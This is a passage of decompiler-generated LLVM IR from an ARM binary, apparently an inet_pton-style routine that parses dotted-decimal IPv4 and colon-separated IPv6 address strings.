  %v9_13cd8 = icmp eq i8 %v0_13cf4.in, %v2_13ce0
  br i1 %v9_13cd8, label %dec_label_pc_13cf4, label %dec_label_pc_13ce0

dec_label_pc_13ce0:                               ; preds = %dec_label_pc_13ce0.preheader, %dec_label_pc_13cd8
  %v0_13ce8 = phi i32 [ %tmp, %dec_label_pc_13ce0.preheader ], [ %v1_13ce8, %dec_label_pc_13cd8 ]
  %v1_13ce0 = inttoptr i32 %v0_13ce8 to i8*
  %v2_13ce0 = load i8, i8* %v1_13ce0, align 1
  %v3_13ce0 = zext i8 %v2_13ce0 to i32
  store i32 %v3_13ce0, i32* @ip, align 4
  %v2_13ce4 = icmp eq i8 %v2_13ce0, 0
  br i1 %v2_13ce4, label %dec_label_pc_13d14, label %dec_label_pc_13cd8

dec_label_pc_13cf4:                               ; preds = %dec_label_pc_13cd8
  %v2_13cf4 = icmp eq i8 %v0_13cf4.in, 0
  br i1 %v2_13cf4, label %dec_label_pc_13d14, label %dec_label_pc_13cfc

dec_label_pc_13cfc:                               ; preds = %dec_label_pc_13cf4
  %v1_13cfc = add i32 %v0_13cfc, 1
  store i32 %v1_13cfc, i32* @lr, align 4
  %v1_13d00 = add i32 %v0_13d00, 1
  %v1_13d04 = inttoptr i32 %v1_13d00 to i8*
  %v2_13d04 = load i8, i8* %v1_13d04, align 1
  %v2_13d08 = icmp eq i8 %v2_13d04, 0
  br i1 %v2_13d08, label %dec_label_pc_13d14, label %dec_label_pc_13ce0.preheader

dec_label_pc_13ce0.preheader:                     ; preds = %dec_label_pc_13ccc, %dec_label_pc_13cfc
  %v0_13d00 = phi i32 [ %v1_13d00, %dec_label_pc_13cfc ], [ %v0_13d042, %dec_label_pc_13ccc ]
  %v0_13cfc = phi i32 [ %v1_13cfc, %dec_label_pc_13cfc ], [ 0, %dec_label_pc_13ccc ]
  %v0_13cf4.in = phi i8 [ %v2_13d04, %dec_label_pc_13cfc ], [ %v2_13d044, %dec_label_pc_13ccc ]
  br label %dec_label_pc_13ce0

dec_label_pc_13d14:                               ; preds = %dec_label_pc_13cf4, %dec_label_pc_13cfc, %dec_label_pc_13ce0, %dec_label_pc_13ccc
  %v0_13d14 = phi i32 [ 0, %dec_label_pc_13ccc ], [ %v0_13cfc, %dec_label_pc_13ce0 ], [ %v1_13cfc, %dec_label_pc_13cfc ], [ %v0_13cfc, %dec_label_pc_13cf4 ]
  ret i32 %v0_13d14

; uselistorder directives
  uselistorder i8 %v0_13cf4.in, { 1, 0 }
  uselistorder i8 %v2_13ce0, { 1, 2, 0 }
  uselistorder i32 %v0_13ce8, { 1, 0 }
  uselistorder i32* @ip, { 7, 8, 3, 12, 13, 14, 15, 9, 17, 16, 0, 18, 19, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 20, 21, 22, 23, 24, 25, 26, 27, 40, 41, 5, 42, 4, 43, 6, 11, 90, 87, 88, 89, 1, 91, 28, 29, 30, 31, 32, 2, 33, 34, 35, 36, 37, 38, 10, 44, 39 }
  uselistorder label %dec_label_pc_13d14, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13ce0.preheader, { 1, 0 }
}

define i32 @function_13d1c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13d1c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_13d1c = load i32, i32* @r5, align 4
  %v2_13d24 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_13d24, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_13dac3 = load i8, i8* %arg1, align 1
  %v3_13dac4 = zext i8 %v2_13dac3 to i32
  %v5_13dac5 = add i32 %tmp, 1
  store i32 %v5_13dac5, i32* @r4, align 4
  %v2_13db06 = icmp eq i8 %v2_13dac3, 0
  store i1 %v2_13db06, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13db06, label %dec_label_pc_13dbc, label %dec_label_pc_13d44

dec_label_pc_13d44:                               ; preds = %dec_label_pc_13d1c, %dec_label_pc_13dac.backedge
  %v0_13d88 = phi i32 [ %v3_13dac, %dec_label_pc_13dac.backedge ], [ %v3_13dac4, %dec_label_pc_13d1c ]
  %v1_13db410.in = phi i32 [ %v3_13dac, %dec_label_pc_13dac.backedge ], [ %v3_13dac4, %dec_label_pc_13d1c ]
  %v1_13db410 = add nsw i32 %v1_13db410.in, -48
  %v2_13d44 = icmp ugt i32 %v1_13db410, 8
  %v7_13d44 = icmp eq i32 %v1_13db410, 9
  store i1 %v7_13d44, i1* %cpsr_z.global-to-local, align 1
  %v2_13d4c = xor i1 %v7_13d44, true
  %v3_13d4c = and i1 %v2_13d44, %v2_13d4c
  br i1 %v3_13d4c, label %dec_label_pc_13d88, label %dec_label_pc_13d50

dec_label_pc_13d50:                               ; preds = %dec_label_pc_13d44
  %v0_13d50 = load i32, i32* %r0.global-to-local, align 4
  %v1_13d50 = inttoptr i32 %v0_13d50 to i8*
  %v2_13d50 = load i8, i8* %v1_13d50, align 1
  %v3_13d50 = zext i8 %v2_13d50 to i32
  %v3_13d58 = mul nuw nsw i32 %v3_13d50, 10
  %v4_13d58 = add nuw nsw i32 %v3_13d58, %v0_13d88
  %v1_13d5c = add nsw i32 %v4_13d58, -48
  %v2_13d60 = icmp ugt i32 %v1_13d5c, 254
  %v7_13d60 = icmp eq i32 %v1_13d5c, 255
  store i1 %v7_13d60, i1* %cpsr_z.global-to-local, align 1
  %v2_13d64 = xor i1 %v7_13d60, true
  %v3_13d64 = and i1 %v2_13d60, %v2_13d64
  br i1 %v3_13d64, label %dec_label_pc_13de0, label %dec_label_pc_13d68

dec_label_pc_13d68:                               ; preds = %dec_label_pc_13d50
  %v0_13d68 = load i32, i32* %r1.global-to-local, align 4
  %v2_13d68 = icmp eq i32 %v0_13d68, 0
  store i1 %v2_13d68, i1* %cpsr_z.global-to-local, align 1
  %v1_13d6c = trunc i32 %v1_13d5c to i8
  store i8 %v1_13d6c, i8* %v1_13d50, align 1
  %v0_13d70 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13d70, label %dec_label_pc_13d74, label %dec_label_pc_13dac.backedge

dec_label_pc_13d74:                               ; preds = %dec_label_pc_13d68
  %v0_13d74 = load i32, i32* @lr, align 4
  %v1_13d74 = add i32 %v0_13d74, 1
  store i32 %v1_13d74, i32* @lr, align 4
  %v7_13d78 = icmp eq i32 %v1_13d74, 4
  store i1 %v7_13d78, i1* %cpsr_z.global-to-local, align 1
  %v0_13d7c = load i32, i32* %r1.global-to-local, align 4
  %v1_13d7c = add i32 %v0_13d7c, 1
  store i32 %v1_13d7c, i32* %r1.global-to-local, align 4
  %v8_13d80 = icmp sgt i32 %v1_13d74, 4
  br i1 %v8_13d80, label %dec_label_pc_13de0, label %dec_label_pc_13dac.backedge

dec_label_pc_13d88:                               ; preds = %dec_label_pc_13d44
  %v7_13d88 = icmp eq i32 %v0_13d88, 46
  store i1 %v7_13d88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13d88, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_13d88
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13de0

bb:                                               ; preds = %dec_label_pc_13d88
  %v1_13d90 = load i32, i32* %r1.global-to-local, align 4
  %v2_13d90 = urem i32 %v1_13d90, 2
  %v2_13d94 = icmp eq i32 %v2_13d90, 0
  store i1 %v2_13d94, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_13d94, label %dec_label_pc_13de0, label %dec_label_pc_13da0

dec_label_pc_13da0:                               ; preds = %bb
  %v0_13da0 = load i32, i32* @lr, align 4
  %v7_13da0 = icmp eq i32 %v0_13da0, 4
  store i1 %v7_13da0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13da0, label %dec_label_pc_13de0, label %dec_label_pc_13da8

dec_label_pc_13da8:                               ; preds = %dec_label_pc_13da0
  %v2_13da8 = load i32, i32* %r0.global-to-local, align 4
  %v3_13da8 = add i32 %v2_13da8, 1
  %v4_13da8 = inttoptr i32 %v3_13da8 to i8*
  store i8 0, i8* %v4_13da8, align 1
  %v5_13da8 = load i32, i32* %r0.global-to-local, align 4
  %v6_13da8 = add i32 %v5_13da8, 1
  store i32 %v6_13da8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13dac.backedge

dec_label_pc_13dac.backedge:                      ; preds = %dec_label_pc_13da8, %dec_label_pc_13d68, %dec_label_pc_13d74
  %v0_13dac = load i32, i32* @r4, align 4
  %v1_13dac = inttoptr i32 %v0_13dac to i8*
  %v2_13dac = load i8, i8* %v1_13dac, align 1
  %v3_13dac = zext i8 %v2_13dac to i32
  %v5_13dac = add i32 %v0_13dac, 1
  store i32 %v5_13dac, i32* @r4, align 4
  %v2_13db0 = icmp eq i8 %v2_13dac, 0
  store i1 %v2_13db0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13db0, label %dec_label_pc_13dac.dec_label_pc_13dbc_crit_edge, label %dec_label_pc_13d44

dec_label_pc_13dac.dec_label_pc_13dbc_crit_edge:  ; preds = %dec_label_pc_13dac.backedge
  %v0_13dbc.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_13dbc

dec_label_pc_13dbc:                               ; preds = %dec_label_pc_13dac.dec_label_pc_13dbc_crit_edge, %dec_label_pc_13d1c
  %v0_13dbc = phi i32 [ %v0_13dbc.pre, %dec_label_pc_13dac.dec_label_pc_13dbc_crit_edge ], [ 0, %dec_label_pc_13d1c ]
  %v7_13dbc = icmp eq i32 %v0_13dbc, 3
  store i1 %v7_13dbc, i1* %cpsr_z.global-to-local, align 1
  %v7_13dc0 = icmp slt i32 %v0_13dbc, 4
  br i1 %v7_13dc0, label %dec_label_pc_13de0, label %dec_label_pc_13dc4

dec_label_pc_13dc4:                               ; preds = %dec_label_pc_13dbc
  %v0_13dc4 = load i32, i32* @r5, align 4
  store i32 %v0_13dc4, i32* @r0, align 4
  store i32 %v2_13d24, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_13dd0 = call i32 @function_ef60()
  br label %dec_label_pc_13de0

dec_label_pc_13de0:                               ; preds = %dec_label_pc_13d50, %dec_label_pc_13d74, %bb, %dec_label_pc_13da0, %.thread12, %dec_label_pc_13dbc, %dec_label_pc_13dc4
  %storemerge = phi i32 [ 1, %dec_label_pc_13dc4 ], [ 0, %dec_label_pc_13dbc ], [ 0, %.thread12 ], [ 0, %dec_label_pc_13da0 ], [ 0, %bb ], [ 0, %dec_label_pc_13d74 ], [ 0, %dec_label_pc_13d50 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_13d1c, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_13dbc, { 1, 0 }
  uselistorder i32 %v3_13dac, { 1, 0 }
  uselistorder i32 %v0_13d88, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 10, 2, 3, 0, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_13de0, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_13dac.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13d44, { 1, 0 }
}

define i32 @function_13de8(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13de8:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_13de8 = load i32, i32* @r4, align 4
  %v6_13de8 = load i32, i32* @r5, align 4
  %v9_13de8 = load i32, i32* @r6, align 4
  %v7_13dec = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_13dec, label %dec_label_pc_13e0c, label %dec_label_pc_13e00

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13de8
  %v7_13e00 = icmp eq i32 %arg1, 10
  br i1 %v7_13e00, label %dec_label_pc_13e20, label %dec_label_pc_13fd0

dec_label_pc_13e0c:                               ; preds = %dec_label_pc_13de8
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_13e14 = call i32 @function_13d1c(i8* %arg2, i32 %arg3)
  store i32 %v4_13e14, i32* %r0.global-to-local, align 4
  store i32 %v4_13e14, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13fe8

dec_label_pc_13e20:                               ; preds = %dec_label_pc_13e00
  %v2_13e20 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_13e20, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_13e2c = bitcast i32* %stack_var_-52 to i8*
  %v3_13e2c = call i32 @function_ef70(i8* %v2_13e2c, i32 0)
  store i32 %v3_13e2c, i32* %r0.global-to-local, align 4
  %v0_13e30 = load i32, i32* @r6, align 4
  %v1_13e30 = inttoptr i32 %v0_13e30 to i8*
  %v2_13e30 = load i8, i8* %v1_13e30, align 1
  %v3_13e30 = zext i8 %v2_13e30 to i32
  store i32 %v3_13e30, i32* %r3.global-to-local, align 4
  %v7_13e34 = icmp eq i8 %v2_13e30, 58
  store i32 %v3_13e2c, i32* @r4, align 4
  %v2_13e3c = add i32 %v3_13e2c, 16
  store i32 %v2_13e3c, i32* %r8.global-to-local, align 4
  br i1 %v7_13e34, label %dec_label_pc_13e44, label %dec_label_pc_13e50

dec_label_pc_13e44:                               ; preds = %dec_label_pc_13e20
  %v1_13e44 = add i32 %v0_13e30, 1
  %v2_13e44 = inttoptr i32 %v1_13e44 to i8*
  %v3_13e44 = load i8, i8* %v2_13e44, align 1
  %v4_13e44 = zext i8 %v3_13e44 to i32
  store i32 %v4_13e44, i32* %r3.global-to-local, align 4
  store i32 %v1_13e44, i32* @r6, align 4
  %v7_13e48 = icmp eq i8 %v3_13e44, 58
  br i1 %v7_13e48, label %dec_label_pc_13e50, label %dec_label_pc_13fe4

dec_label_pc_13e50:                               ; preds = %dec_label_pc_13e44, %dec_label_pc_13e20
  %v0_13e54 = phi i32 [ %v1_13e44, %dec_label_pc_13e44 ], [ %v0_13e30, %dec_label_pc_13e20 ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_13e54, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_13f307 = inttoptr i32 %v0_13e54 to i8*
  %v2_13f308 = load i8, i8* %v1_13f307, align 1
  %v3_13f309 = zext i8 %v2_13f308 to i32
  store i32 %v3_13f309, i32* %r0.global-to-local, align 4
  %v1_13f3410 = call i32 @function_14a94(i32 %v3_13f309)
  store i32 %v1_13f3410, i32* %r0.global-to-local, align 4
  store i32 %v1_13f3410, i32* @r5, align 4
  %v2_13f3812 = icmp eq i32 %v1_13f3410, 0
  br i1 %v2_13f3812, label %dec_label_pc_13f40, label %dec_label_pc_13e64

dec_label_pc_13e64:                               ; preds = %dec_label_pc_13e50, %dec_label_pc_13f30.backedge
  %v0_13e68 = phi i32 [ %v1_13f34, %dec_label_pc_13f30.backedge ], [ %v1_13f3410, %dec_label_pc_13e50 ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_13f30.backedge ], [ 0, %dec_label_pc_13e50 ]
  store i32 ptrtoint ([17 x i8]* @global_var_17554.616 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_17554.616 to i32), i32* %r0.global-to-local, align 4
  %v3_13e70 = call i32 @function_14ac8(i32 ptrtoint ([17 x i8]* @global_var_17554.616 to i32), i32 %v0_13e68)
  %v4_13e70 = trunc i32 %v3_13e70 to i8
  store i32 %v3_13e70, i32* %r0.global-to-local, align 4
  %v3_13e74 = icmp eq i8 %v4_13e70, 0
  %v0_13e78 = load i32, i32* @r6, align 4
  %v1_13e78 = add i32 %v0_13e78, 1
  store i32 %v1_13e78, i32* @r6, align 4
  br i1 %v3_13e74, label %dec_label_pc_13e94, label %dec_label_pc_13e80

dec_label_pc_13e80:                               ; preds = %dec_label_pc_13e64
  %v0_13e80 = load i32, i32* %sb.global-to-local, align 4
  %v2_13e80 = sext i8 %v4_13e70 to i32
  %v3_13e80 = sub i32 %v2_13e80, %v0_13e80
  store i32 %v3_13e80, i32* %r3.global-to-local, align 4
  %v1_13e84 = load i32, i32* %r7.global-to-local, align 4
  %v4_13e84 = mul i32 %v1_13e84, 16
  %v5_13e84 = or i32 %v4_13e84, %v3_13e80
  store i32 %v5_13e84, i32* %r7.global-to-local, align 4
  %v3_13e8c = icmp ult i32 %v5_13e84, 65534
  br i1 %v3_13e8c, label %dec_label_pc_13f28, label %dec_label_pc_13fe4

dec_label_pc_13e94:                               ; preds = %dec_label_pc_13e64
  %v0_13e94 = load i32, i32* @r5, align 4
  %v7_13e94 = icmp eq i32 %v0_13e94, 58
  br i1 %v7_13e94, label %dec_label_pc_13e9c, label %dec_label_pc_13ef8

dec_label_pc_13e9c:                               ; preds = %dec_label_pc_13e94
  %v4_13e9c2 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_13e9c2, i32* %r3.global-to-local, align 4
  %v2_13ea0 = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_13ea0, label %dec_label_pc_13ea8, label %dec_label_pc_13ebc

dec_label_pc_13ea8:                               ; preds = %dec_label_pc_13e9c
  %v0_13ea8 = load i32, i32* %fp.global-to-local, align 4
  %v2_13ea8 = icmp eq i32 %v0_13ea8, 0
  br i1 %v2_13ea8, label %dec_label_pc_13eb0, label %dec_label_pc_13fe4

dec_label_pc_13eb0:                               ; preds = %dec_label_pc_13ea8
  %v0_13eb0 = load i32, i32* @r4, align 4
  store i32 %v0_13eb0, i32* %fp.global-to-local, align 4
  store i32 %v1_13e78, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13f30.backedge

dec_label_pc_13ebc:                               ; preds = %dec_label_pc_13e9c
  %v1_13ebc = inttoptr i32 %v1_13e78 to i8*
  %v2_13ebc = load i8, i8* %v1_13ebc, align 1
  %v3_13ebc = zext i8 %v2_13ebc to i32
  store i32 %v3_13ebc, i32* %r3.global-to-local, align 4
  %v2_13ec0 = icmp eq i8 %v2_13ebc, 0
  br i1 %v2_13ec0, label %dec_label_pc_13fe4, label %dec_label_pc_13ec8

dec_label_pc_13ec8:                               ; preds = %dec_label_pc_13ebc
  %v0_13ec8 = load i32, i32* @r4, align 4
  %v1_13ec8 = add i32 %v0_13ec8, 2
  store i32 %v1_13ec8, i32* %r3.global-to-local, align 4
  %v1_13ecc = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_13ec8, %v1_13ecc
  br i1 %tmp38, label %dec_label_pc_13fe4, label %dec_label_pc_13ed4

dec_label_pc_13ed4:                               ; preds = %dec_label_pc_13ec8
  %v0_13ed4 = load i32, i32* %r7.global-to-local, align 4
  %v3_13ed4 = udiv i32 %v0_13ed4, 256
  store i32 %v3_13ed4, i32* %r2.global-to-local, align 4
  store i32 %v0_13ec8, i32* %r3.global-to-local, align 4
  %v1_13edc = trunc i32 %v3_13ed4 to i8
  %v3_13edc = inttoptr i32 %v0_13ec8 to i8*
  store i8 %v1_13edc, i8* %v3_13edc, align 1
  %v4_13edc = load i32, i32* %r3.global-to-local, align 4
  %v5_13edc = add i32 %v4_13edc, 1
  store i32 %v5_13edc, i32* %r3.global-to-local, align 4
  %v0_13ee0 = load i32, i32* @r6, align 4
  store i32 %v0_13ee0, i32* %sl.global-to-local, align 4
  %v0_13ee4 = load i32, i32* %r7.global-to-local, align 4
  %v1_13ee4 = trunc i32 %v0_13ee4 to i8
  %v2_13ee4 = load i32, i32* @r4, align 4
  %v3_13ee4 = add i32 %v2_13ee4, 1
  %v4_13ee4 = inttoptr i32 %v3_13ee4 to i8*
  store i8 %v1_13ee4, i8* %v4_13ee4, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_13eec = load i32, i32* %r3.global-to-local, align 4
  %v1_13eec = add i32 %v0_13eec, 1
  store i32 %v1_13eec, i32* @r4, align 4
  %v0_13f30.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13f30.backedge

dec_label_pc_13ef8:                               ; preds = %dec_label_pc_13e94
  %v7_13ef8 = icmp eq i32 %v0_13e94, 46
  br i1 %v7_13ef8, label %dec_label_pc_13f00, label %dec_label_pc_13fe4

dec_label_pc_13f00:                               ; preds = %dec_label_pc_13ef8
  %v0_13f00 = load i32, i32* @r4, align 4
  %v1_13f00 = add i32 %v0_13f00, 4
  store i32 %v1_13f00, i32* @r5, align 4
  %v1_13f04 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_13f00, %v1_13f04
  br i1 %tmp39, label %dec_label_pc_13fe4, label %dec_label_pc_13f0c

dec_label_pc_13f0c:                               ; preds = %dec_label_pc_13f00
  %v0_13f10 = load i32, i32* %sl.global-to-local, align 4
  %v1_13f10 = inttoptr i32 %v0_13f10 to i8*
  store i32 %v0_13f10, i32* %r0.global-to-local, align 4
  %v4_13f14 = call i32 @function_13d1c(i8* %v1_13f10, i32 %v0_13f00)
  store i32 %v4_13f14, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_13f14, 1
  br i1 %tmp36, label %dec_label_pc_13fe4, label %bb

bb:                                               ; preds = %dec_label_pc_13f0c
  %v5_13f1c = load i32, i32* @r5, align 4
  store i32 %v5_13f1c, i32* @r4, align 4
  br label %dec_label_pc_13f6c

dec_label_pc_13f28:                               ; preds = %dec_label_pc_13e80
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13f30.backedge

dec_label_pc_13f30.backedge:                      ; preds = %dec_label_pc_13f28, %dec_label_pc_13eb0, %dec_label_pc_13ed4
  %v0_13f30 = phi i32 [ %v1_13e78, %dec_label_pc_13eb0 ], [ %v0_13f30.pre, %dec_label_pc_13ed4 ], [ %v1_13e78, %dec_label_pc_13f28 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_13eb0 ], [ 0, %dec_label_pc_13ed4 ], [ 1, %dec_label_pc_13f28 ]
  %v1_13f30 = inttoptr i32 %v0_13f30 to i8*
  %v2_13f30 = load i8, i8* %v1_13f30, align 1
  %v3_13f30 = zext i8 %v2_13f30 to i32
  store i32 %v3_13f30, i32* %r0.global-to-local, align 4
  %v1_13f34 = call i32 @function_14a94(i32 %v3_13f30)
  store i32 %v1_13f34, i32* %r0.global-to-local, align 4
  store i32 %v1_13f34, i32* @r5, align 4
  %v2_13f38 = icmp eq i32 %v1_13f34, 0
  br i1 %v2_13f38, label %dec_label_pc_13f40, label %dec_label_pc_13e64

dec_label_pc_13f40:                               ; preds = %dec_label_pc_13f30.backedge, %dec_label_pc_13e50
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_13e50 ], [ %stack_var_-56.0.be, %dec_label_pc_13f30.backedge ]
  %v4_13f403 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_13f403, i32* %r3.global-to-local, align 4
  %v2_13f44 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_13fb0.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_13f44, label %dec_label_pc_13f6c, label %dec_label_pc_13f4c

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13f40
  %v1_13f4c = add i32 %v0_13fb0.pre.pre, 2
  store i32 %v1_13f4c, i32* %r3.global-to-local, align 4
  %v1_13f50 = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_13f4c, %v1_13f50
  br i1 %tmp40, label %dec_label_pc_13fe4, label %dec_label_pc_13f58

dec_label_pc_13f58:                               ; preds = %dec_label_pc_13f4c
  store i32 %v0_13fb0.pre.pre, i32* %r3.global-to-local, align 4
  %v0_13f5c = load i32, i32* %r7.global-to-local, align 4
  %v3_13f5c = udiv i32 %v0_13f5c, 256
  store i32 %v3_13f5c, i32* %r2.global-to-local, align 4
  %v1_13f60 = trunc i32 %v3_13f5c to i8
  %v3_13f60 = inttoptr i32 %v0_13fb0.pre.pre to i8*
  store i8 %v1_13f60, i8* %v3_13f60, align 1
  %v4_13f60 = load i32, i32* %r3.global-to-local, align 4
  %v5_13f60 = add i32 %v4_13f60, 1
  store i32 %v5_13f60, i32* %r3.global-to-local, align 4
  %v0_13f64 = load i32, i32* %r7.global-to-local, align 4
  %v1_13f64 = trunc i32 %v0_13f64 to i8
  %v2_13f64 = load i32, i32* @r4, align 4
  %v3_13f64 = add i32 %v2_13f64, 1
  %v4_13f64 = inttoptr i32 %v3_13f64 to i8*
  store i8 %v1_13f64, i8* %v4_13f64, align 1
  %v0_13f68 = load i32, i32* %r3.global-to-local, align 4
  %v1_13f68 = add i32 %v0_13f68, 1
  store i32 %v1_13f68, i32* @r4, align 4
  br label %dec_label_pc_13f6c

dec_label_pc_13f6c:                               ; preds = %dec_label_pc_13f40, %bb, %dec_label_pc_13f58
  %v0_13fb0.pre = phi i32 [ %v5_13f1c, %bb ], [ %v1_13f68, %dec_label_pc_13f58 ], [ %v0_13fb0.pre.pre, %dec_label_pc_13f40 ]
  %v0_13f6c = load i32, i32* %fp.global-to-local, align 4
  %v2_13f6c = icmp eq i32 %v0_13f6c, 0
  %v1_13fb0.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_13f6c, label %dec_label_pc_13fb0, label %dec_label_pc_13f74

dec_label_pc_13f74:                               ; preds = %dec_label_pc_13f6c
  %v9_13f74 = icmp eq i32 %v0_13fb0.pre, %v1_13fb0.pre
  %v2_13f78 = sub i32 %v0_13fb0.pre, %v0_13f6c
  store i32 %v2_13f78, i32* %r0.global-to-local, align 4
  br i1 %v9_13f74, label %dec_label_pc_13fe4, label %dec_label_pc_13f98.preheader

dec_label_pc_13f98.preheader:                     ; preds = %dec_label_pc_13f74
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f98

dec_label_pc_13f88:                               ; preds = %dec_label_pc_13f98
  %v0_13f88 = load i32, i32* %fp.global-to-local, align 4
  %v2_13f88 = add i32 %v0_13f88, %v2_13f9c
  %v3_13f88 = inttoptr i32 %v2_13f88 to i8*
  %v4_13f88 = load i8, i8* %v3_13f88, align 1
  %v3_13f8c = inttoptr i32 %v2_13fa0 to i8*
  store i8 %v4_13f88, i8* %v3_13f8c, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_13f94 = load i32, i32* %fp.global-to-local, align 4
  %v3_13f94 = load i32, i32* %ip.global-to-local, align 4
  %v4_13f94 = add i32 %v3_13f94, %v2_13f94
  %v5_13f94 = inttoptr i32 %v4_13f94 to i8*
  store i8 0, i8* %v5_13f94, align 1
  %v0_13f98.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13f98.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_13fa0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13f98

dec_label_pc_13f98:                               ; preds = %dec_label_pc_13f98.preheader, %dec_label_pc_13f88
  %v0_13fac = phi i32 [ %v1_13fb0.pre, %dec_label_pc_13f98.preheader ], [ %v1_13fa0.pre, %dec_label_pc_13f88 ]
  %v1_13f9c = phi i32 [ %v2_13f78, %dec_label_pc_13f98.preheader ], [ %v1_13f98.pre, %dec_label_pc_13f88 ]
  %v0_13fa4 = phi i32 [ 1, %dec_label_pc_13f98.preheader ], [ %v0_13f98.pre, %dec_label_pc_13f88 ]
  %v2_13f9c = sub i32 %v1_13f9c, %v0_13fa4
  store i32 %v2_13f9c, i32* %ip.global-to-local, align 4
  %v2_13fa0 = sub i32 %v0_13fac, %v0_13fa4
  store i32 %v2_13fa0, i32* @lr, align 4
  %v1_13fa4 = add i32 %v0_13fa4, 1
  store i32 %v1_13fa4, i32* %r2.global-to-local, align 4
  %v7_13fa8 = icmp slt i32 %v1_13f9c, %v0_13fa4
  br i1 %v7_13fa8, label %dec_label_pc_13fac, label %dec_label_pc_13f88

dec_label_pc_13fac:                               ; preds = %dec_label_pc_13f98
  store i32 %v0_13fac, i32* @r4, align 4
  br label %dec_label_pc_13fb0

dec_label_pc_13fb0:                               ; preds = %dec_label_pc_13f6c, %dec_label_pc_13fac
  %v0_13fb0 = phi i32 [ %v0_13fac, %dec_label_pc_13fac ], [ %v0_13fb0.pre, %dec_label_pc_13f6c ]
